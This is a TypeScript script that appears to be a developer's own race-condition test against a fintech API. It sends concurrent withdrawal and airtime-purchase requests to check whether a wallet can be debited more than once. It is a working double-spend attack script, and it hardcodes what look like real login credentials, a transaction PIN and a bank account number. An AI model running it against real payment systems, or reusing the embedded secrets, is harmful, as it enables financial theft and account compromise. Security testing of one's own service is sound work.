#!/usr/bin/env ts-node
/**
 * Race Condition Exploit Test
 *
 * This script demonstrates race condition vulnerabilities in:
 * 1. Withdrawal endpoint
 * 2. Airtime purchase endpoint
 * 3. Data purchase endpoint
 *
 * USAGE:
 *   npx ts-node scripts/race-condition-test.ts
 */

import axios, { AxiosError } from 'axios';

// ============== CONFIGURATION ==============
const CONFIG = {
  // API Base URL (with /api prefix)
  BASE_URL: 'https://hydrometeorological-unjudicial-jeffie.ngrok-free.dev/api',

  // Login credentials
  EMAIL: 'codeswithjoseph@gmail.com',
  PASSWORD: '6thbornR%',

  // Withdrawal destination
  BANK_CODE: '50515', // MoniePoint bank code
  ACCOUNT_NUMBER: '5123946180',

  // VTU test parameters
  VTU_PHONE: '08011111111',
  VTU_NETWORK: 'MTN',

  // Test parameters
  PIN: '9406',
  WITHDRAWAL_AMOUNT: 100, // Minimum withdrawal
  AIRTIME_AMOUNT: 50, // Minimum ₦50
  CONCURRENT_REQUESTS: 3, // Reduced to save Paystack balance
};

// ============== HELPERS ==============
const api = axios.create({
  baseURL: CONFIG.BASE_URL,
  timeout: 30000,
  headers: {
    'Content-Type': 'application/json',
    'ngrok-skip-browser-warning': 'true',
  },
});

interface LoginResponse {
  accessToken: string;
  user: { id: string; firstName: string };
}

interface WalletResponse {
  balance: string;
}

// ============== MAIN TEST ==============
async function runRaceConditionTest() {
  console.log('═══════════════════════════════════════════════════════════');
  console.log('       RACE CONDITION EXPLOIT TEST');
  console.log('═══════════════════════════════════════════════════════════\n');

  // Step 1: Login
  console.log('🔐 Step 1: Logging in...');
  let accessToken: string;

  try {
    const loginRes = await api.post<LoginResponse>('/auth/login', {
      identifier: CONFIG.EMAIL,
      password: CONFIG.PASSWORD,
    });
    accessToken = loginRes.data.accessToken;
    console.log(`   ✅ Logged in as ${loginRes.data.user.firstName}\n`);
  } catch (error) {
    const axiosError = error as AxiosError<any>;
    console.error(
      '   ❌ Login failed:',
      axiosError.response?.data?.message || axiosError.message,
    );
    if (axiosError.response?.data?.requiresDeviceVerification) {
      console.log(
        '\n   ⚠️  Device verification required! Login from mobile app first.',
      );
    }
    return;
  }

  // Step 2: Get current wallet balance
  console.log('💰 Step 2: Getting wallet balance...');
  let startBalance: number;

  try {
    const walletRes = await api.get<WalletResponse>('/wallet', {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    startBalance = parseFloat(walletRes.data.balance);
    console.log(`   Current balance: ₦${startBalance.toLocaleString()}\n`);
  } catch (error) {
    const axiosError = error as AxiosError<any>;
    console.error(
      '   ❌ Failed to get wallet:',
      axiosError.response?.data?.message,
    );
    return;
  }

  // Ask user which test to run
  console.log('═══════════════════════════════════════════════════════════');
  console.log('   SELECT TEST TYPE:');
  console.log('   1 = Withdrawal');
  console.log('   2 = Airtime Purchase');
  console.log('   3 = All Tests');
  console.log('═══════════════════════════════════════════════════════════\n');

  // Run only withdrawal test to save money
  const testType: number = 1;

  if (testType === 1 || testType === 3) {
    await testWithdrawalRaceCondition(accessToken, startBalance);
  }

  if (testType === 2 || testType === 3) {
    // Refresh balance after withdrawal test
    const walletRes = await api.get<WalletResponse>('/wallet', {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    const newBalance = parseFloat(walletRes.data.balance);
    await testAirtimeRaceCondition(accessToken, newBalance);
  }

  // Final balance
  console.log('═══════════════════════════════════════════════════════════');
  console.log('📊 FINAL SUMMARY');
  console.log('═══════════════════════════════════════════════════════════\n');

  const finalWalletRes = await api.get<WalletResponse>('/wallet', {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const finalBalance = parseFloat(finalWalletRes.data.balance);

  console.log(`   Starting balance: ₦${startBalance.toLocaleString()}`);
  console.log(`   Final balance:    ₦${finalBalance.toLocaleString()}`);
  console.log(
    `   Total debited:    ₦${(startBalance - finalBalance).toLocaleString()}\n`,
  );
}

// ============== WITHDRAWAL TEST ==============
async function testWithdrawalRaceCondition(
  accessToken: string,
  balance: number,
) {
  console.log('═══════════════════════════════════════════════════════════');
  console.log('🏧 TEST 1: WITHDRAWAL RACE CONDITION');
  console.log('═══════════════════════════════════════════════════════════\n');

  // Check balance
  const requiredAmount = CONFIG.WITHDRAWAL_AMOUNT + 50;
  if (balance < requiredAmount) {
    console.log(
      `   ⚠️  Skipping - Need ₦${requiredAmount}, have ₦${balance}\n`,
    );
    return;
  }

  // Resolve account first
  let accountName: string;
  try {
    const resolveRes = await api.post(
      '/transactions/resolve-account',
      { accountNumber: CONFIG.ACCOUNT_NUMBER, bankCode: CONFIG.BANK_CODE },
      { headers: { Authorization: `Bearer ${accessToken}` } },
    );
    accountName = resolveRes.data.accountName;
    console.log(`   Target: ${accountName} (${CONFIG.ACCOUNT_NUMBER})`);
  } catch (error) {
    console.error('   ❌ Failed to resolve account');
    return;
  }

  console.log(
    `   Firing ${CONFIG.CONCURRENT_REQUESTS} concurrent withdrawals...\n`,
  );

  const startTime = Date.now();
  const promises = Array(CONFIG.CONCURRENT_REQUESTS)
    .fill(null)
    .map((_, i) => {
      return api
        .post(
          '/transactions/withdraw',
          {
            amount: CONFIG.WITHDRAWAL_AMOUNT + i,
            accountNumber: CONFIG.ACCOUNT_NUMBER,
            accountName: accountName,
            bankCode: CONFIG.BANK_CODE,
            pin: CONFIG.PIN,
            narration: `Race test ${i + 1}`,
          },
          { headers: { Authorization: `Bearer ${accessToken}` } },
        )
        .then((res) => ({
          index: i + 1,
          success: true,
          data: res.data,
          ms: Date.now() - startTime,
        }))
        .catch((err) => ({
          index: i + 1,
          success: false,
          error: err.response?.data?.message || err.message,
          ms: Date.now() - startTime,
        }));
    });

  const results = await Promise.all(promises);
  printResults('WITHDRAWAL', results);
}

// ============== AIRTIME TEST ==============
async function testAirtimeRaceCondition(accessToken: string, balance: number) {
  console.log('═══════════════════════════════════════════════════════════');
  console.log('� TEST 2: AIRTIME PURCHASE RACE CONDITION');
  console.log('═══════════════════════════════════════════════════════════\n');

  if (balance < CONFIG.AIRTIME_AMOUNT * 2) {
    console.log(
      `   ⚠️  Skipping - Need ₦${CONFIG.AIRTIME_AMOUNT * 2}, have ₦${balance}\n`,
    );
    return;
  }

  console.log(`   Target: ${CONFIG.VTU_PHONE} (${CONFIG.VTU_NETWORK})`);
  console.log(
    `   Firing ${CONFIG.CONCURRENT_REQUESTS} concurrent airtime purchases...\n`,
  );

  const startTime = Date.now();
  const promises = Array(CONFIG.CONCURRENT_REQUESTS)
    .fill(null)
    .map((_, i) => {
      return api
        .post(
          '/vtu/airtime/purchase',
          {
            network: CONFIG.VTU_NETWORK,
            phone: CONFIG.VTU_PHONE,
            amount: CONFIG.AIRTIME_AMOUNT,
            pin: CONFIG.PIN,
          },
          { headers: { Authorization: `Bearer ${accessToken}` } },
        )
        .then((res) => ({
          index: i + 1,
          success: true,
          data: res.data,
          ms: Date.now() - startTime,
        }))
        .catch((err) => ({
          index: i + 1,
          success: false,
          error: err.response?.data?.message || err.message,
          ms: Date.now() - startTime,
        }));
    });

  const results = await Promise.all(promises);
  printResults('AIRTIME', results);
}

// ============== RESULTS PRINTER ==============
function printResults(testName: string, results: any[]) {
  const successful = results.filter((r) => r.success);
  const failed = results.filter((r) => !r.success);

  console.log(`   ✅ Successful: ${successful.length}`);
  console.log(`   ❌ Failed: ${failed.length}\n`);

  results.forEach((r: any) => {
    if (r.success) {
      console.log(
        `   Request ${r.index}: ✅ SUCCESS (${r.ms}ms) - Ref: ${r.data.reference || r.data.transactionId || 'N/A'}`,
      );
    } else {
      console.log(`   Request ${r.index}: ❌ FAILED (${r.ms}ms) - ${r.error}`);
    }
  });

  console.log('');

  if (successful.length > 1) {
    console.log(`   🚨 ${testName} RACE CONDITION CONFIRMED!`);
    console.log(
      `   ${successful.length} requests succeeded when only 1 should have!\n`,
    );
  } else if (successful.length === 1) {
    console.log(`   ✅ ${testName} RACE CONDITION NOT EXPLOITABLE\n`);
  } else {
    console.log(`   ⚠️  All ${testName} requests failed\n`);
  }
}

// Run
runRaceConditionTest().catch(console.error);
